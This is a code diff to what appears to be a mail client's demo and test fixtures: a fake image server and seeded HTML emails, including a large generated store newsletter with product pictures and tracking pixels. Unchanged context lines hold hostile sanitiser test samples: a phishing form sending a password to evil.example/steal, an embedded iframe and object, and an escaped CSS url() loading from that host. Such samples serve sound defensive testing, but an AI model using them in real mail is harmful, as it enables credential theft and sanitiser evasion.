@@ -87,9 +87,13 @@ export const demoMailImages = {
   fetch: (async (_input: string | URL | Request, init?: RequestInit) => {
     const host = new Headers(init?.headers).get('host') ?? '';
     if (!host.endsWith('.example')) return new Response('not here', { status: 404 });
-    const seed = [...host].reduce((n, c) => (n * 31 + c.charCodeAt(0)) >>> 0, 7);
+    const u = new URL(String(_input instanceof Request ? _input.url : _input));
+    const seed = [...(host + u.pathname)].reduce((n, c) => (n * 31 + c.charCodeAt(0)) >>> 0, 7);
     const hue = (n: number) => [(seed >> n) & 0xff, (seed >> (n + 8)) & 0xff, 160] as [number, number, number];
-    return new Response(Buffer.from(demoPng(600, 180, hue(0), hue(4))), { headers: { 'content-type': 'image/png' } });
+    // A size the address asks for (`w`, `h`), else a banner's.
+    const w = Math.min(1200, Number(u.searchParams.get('w')) || 600);
+    const h = Math.min(1200, Number(u.searchParams.get('h')) || 180);
+    return new Response(Buffer.from(demoPng(w, h, hue(0), hue(4))), { headers: { 'content-type': 'image/png' } });
   }) as typeof fetch,
 };
 
@@ -128,9 +132,23 @@ export function seedHtmlMail(fake: FakeMailBackend, account: string, me: { name:
       '<form action="https://evil.example/steal"><input name="password" placeholder="Your password"><button>Log in</button></form>' +
       '<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object>' +
       '<p style="color:#555;background-image:u\\72l(https://evil.example/css.png)">Opening hours: 9 to 8, Monday to Saturday.</p>' +
+      '<p>Your member card, ready to scan at the desk:</p><img src="https://images.library.example/card.png?m=9xK2pL7qR4wZ8vB3" width="320" height="120" alt="Member card">' +
       '<img src="https://images.library.example/footer.png" width="568" height="80" alt="">' +
       '<img src="https://track.library.example/open.gif?u=zyan" width="1" height="1" alt="">' +
       '</td></tr></table></body></html>',
+  });
+
+  // A big store newsletter: style sheets, layout tables, dozens of pictures, a personal one and two open pixels.
+  put({
+    messageId: id('winter-sale'),
+    from: [{ name: 'Northbound Outfitters', email: 'deals@store.example' }],
+    to: [me],
+    subject: 'The winter sale is on: up to 50% off',
+    receivedAt: now - 3 * H,
+    flags: { seen: false },
+    bulk: { listId: '<deals.store.example>', unsubscribe: '<https://store.example/unsubscribe>', precedence: 'bulk', autoSubmitted: null },
+    text: 'Northbound Outfitters. The winter sale is on: up to 50% off. Members save another 10% at checkout.',
+    html: demoStoreNewsletter(),
   });
 
   // A letter with a picture inside it, a quote of what you wrote, and two files.
@@ -162,6 +180,49 @@ export function seedHtmlMail(fake: FakeMailBackend, account: string, me: { name:
     ],
     files,
   });
+}
+
+/**
+ * A big store newsletter in the shape real ones have: a style sheet with classes and @media rules, nested layout
+ * tables, dozens of product pictures (shared addresses), a personal header picture and two open pixels. Over 128 KB
+ * once sanitised, so it is the one to forward when trying forwards.
+ */
+export function demoStoreNewsletter(): string {
+  const css =
+    '<style>body{margin:0;background:#eef2f5}.wrap{width:640px;margin:0 auto;background:#ffffff;font-family:Helvetica,Arial,sans-serif;color:#1c2b36}' +
+    '.hdr{background:#0f4c5c;color:#ffffff;padding:18px 24px}.hdr h1{margin:0;font-size:26px;letter-spacing:.5px}.lead{padding:20px 24px;font-size:15px;line-height:1.5}' +
+    '.grid td.cell{width:50%;padding:12px;vertical-align:top}.card{border:1px solid #d8e1e8;border-radius:8px;padding:10px;text-align:center}' +
+    '.card .name{font-weight:bold;font-size:14px;margin:8px 0 2px}.card .price{color:#c2410c;font-size:16px;font-weight:bold}.card .was{color:#7b8a97;text-decoration:line-through;font-size:12px}' +
+    '.btn{display:inline-block;background:#c2410c;color:#ffffff!important;text-decoration:none;padding:8px 14px;border-radius:6px;font-size:13px;margin-top:6px}' +
+    '.foot{background:#f4f6f8;color:#5b6b78;font-size:11px;padding:16px 24px;line-height:1.6}.foot a{color:#5b6b78}' +
+    '@media only screen and (max-width:600px){.wrap{width:100%!important}.grid td.cell{display:block;width:100%!important}.hdr h1{font-size:22px}}</style>';
+  const names = ['Trail runner', 'Rain shell', 'Wool beanie', 'Camp mug', 'Head torch', 'Day pack', 'Merino tee', 'Gaiters', 'Water filter', 'Stove', 'Trekking poles', 'Down vest'];
+  let rows = '';
+  for (let i = 0; i < 34; i++) {
+    const cell = (k: number) => {
+      const n = names[k % names.length];
+      const slug = n.toLowerCase().replace(/\s+/g, '-');
+      return (
+        `<td class="cell"><div class="card"><a href="https://store.example/p/${slug}-${k}"><img src="https://cdn.store.example/products/${slug}-${k}.png?w=260&h=200" width="260" height="200" alt="${n}"></a>` +
+        `<div class="name">${n} ${k + 1}</div><div><span class="price">$${(19 + ((k * 7) % 80)).toFixed(2)}</span> <span class="was">$${(39 + ((k * 7) % 80)).toFixed(2)}</span></div>` +
+        `<p style="font-size:12px;color:#5b6b78;margin:6px 0">Light, tough and ready for the next trip. Free returns for 60 days, and free shipping on orders over $50.</p>` +
+        `<a class="btn" href="https://store.example/cart/add/${k}">Add to cart</a></div></td>`
+      );
+    };
+    rows += `<tr>${cell(2 * i)}${cell(2 * i + 1)}</tr>`;
+  }
+  return (
+    `<html><head>${css}</head><body><table class="wrap" width="640" cellpadding="0" cellspacing="0" align="center"><tr><td>` +
+    '<div class="hdr"><h1>Northbound Outfitters</h1><div style="font-size:13px;opacity:.85">The winter sale is on: up to 50% off</div></div>' +
+    '<img src="https://cdn.store.example/banners/winter-sale.png?w=640&h=240" width="640" height="240" alt="Winter sale" style="display:block;width:100%;height:auto">' +
+    '<img src="https://img.store.example/hi/Zq81mXc2LpR7vN0kTb4W/welcome.png?w=640&h=60" width="640" height="60" alt="Hi there, member" style="display:block">' +
+    '<div class="lead">Our biggest sale of the year starts today. Everything below is in stock and ships within a day. <b>Members save another 10%</b> at checkout.</div>' +
+    `<table class="grid" width="100%" cellpadding="0" cellspacing="0">${rows}</table>` +
+    '<div class="foot">You get this because you have an account with Northbound Outfitters. <a href="https://store.example/prefs">Email preferences</a> · <a href="https://store.example/unsubscribe">Unsubscribe</a><br>Northbound Outfitters, 12 Harbour Road, Portland</div>' +
+    '<img src="https://u.store.example/o/Zq81mXc2LpR7vN0kTb4WmA9dFs3x" width="1" height="1" alt="">' +
+    '<img src="https://shop.us1.list-manage.com/track/open.php?u=1d2c&id=9f8e" width="1" height="1" alt="" style="display:none">' +
+    '</td></tr></table></body></html>'
+  );
 }
 
 /** Bytes for files the slice 1 seed names (its lease PDF). */
